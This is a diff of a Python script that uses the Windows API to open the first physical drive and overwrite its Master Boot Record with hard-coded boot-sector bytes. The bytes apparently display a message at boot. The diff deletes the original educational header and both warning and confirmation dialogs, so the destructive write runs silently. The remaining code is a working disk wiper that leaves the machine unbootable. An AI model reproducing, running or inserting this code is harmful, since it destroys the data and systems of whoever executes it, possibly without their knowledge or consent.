@@ -1,7 +1,4 @@
-# Overwriting the Master Boot Record with custom text in Python!
-# There is a very small change in the Python part, where we change AllocateReaderBuffer(512) to bytes([ HEX DATA ]).
-# However, we will need to implement a boot loader in order to display text.
-# Notice that this might not work for GPT systems, such as VMware.
+# This script might not work in some VMs
 
 # To start, we will need to import libraries that can interact with the Windows API from Python.
 # A common choice for this is pywin32.
@@ -12,35 +9,6 @@ from win32con import *  # Constants like GENERIC_READ etc
 from win32ui import *   # Object oriented Windows API objects.
 import sys # Used to exit the current process. We might use ExitProcess(0), however this is more pythonic.
 
-# Let's start by displaying a warning. We can do this by using the MessageBox function.
-
-title = "! Warning !"
-description = "You are about to execute a severly dangerous program that overwrites the Master Boot Record " \
-			  "of your computer. This will cause irrepairable destructive consequences, and the creator is " \
-			  "not responsible for any damage due to this being made for educational and illustrational purposes " \
-			  "only!\n\nPress \"Yes\" to continue.\nPress \"No\" to exit."
-
-# Display our warning.
-# The parameters are description, title, icons and buttons.
-# The icons and buttons may be customized however you like, eg. you can change MB_ICONWARNING
-# to MB_ICONASTERISK or MB_ICONERROR for other icons. Keep in mind that if you change MB_YESNO
-# to eg. MB_OKCANCEL the return value will differ.
-if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
-	print("No pressed")
-	sys.exit(0)
-
-# Let's make another warning for additional security.
-
-title = "!! LAST WARNING !!"
-description = "This is the last warning! Pressing \"Yes\" will destroy your computer, for a very long time!\n" \
-			  "Are you sure you want to continue, resulting in an unbootable machine?!"
-
-if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
-	print("Second no pressed")
-	sys.exit(0)
-
-print("MBR overwriting...")
-
 # Now let's begin the overwriting!
 # First we will need to create a handle to the boot sector. This is the reason why we're using CreateFileW.
 
@@ -50,10 +18,9 @@ print("MBR overwriting...")
 hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
 					  0, 0)
 
-# So now, how do we make a bootable program? We will need to go very low level, into assembly.
-# Our boot sector data
+# now then, how do we make a bootable program? We will need to go very low level, into assembly.
 buffer = bytes([
-  # paste the boot sector data here
+  # boot sector data goes here
 	0xE8, 0x15, 0x00, 0xBB, 0x27, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x43, 
 	0xEB, 0xF4, 0xB4, 0x0E, 0xCD, 0x10, 0xC3, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00, 
 	0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x73, 0x79, 0x73, 0x74, 
@@ -90,7 +57,7 @@ buffer = bytes([
 
 # Overwrite the Master Boot Record!
 bytes_written = WriteFile(hDevice, buffer, None)
-print("Wrote", bytes_written, "bytes to the Master Boot Record successfully!")
+print("Wrote", bytes_written, "i")
 
 # Release the memory allocated to the handle
 CloseHandle(hDevice)
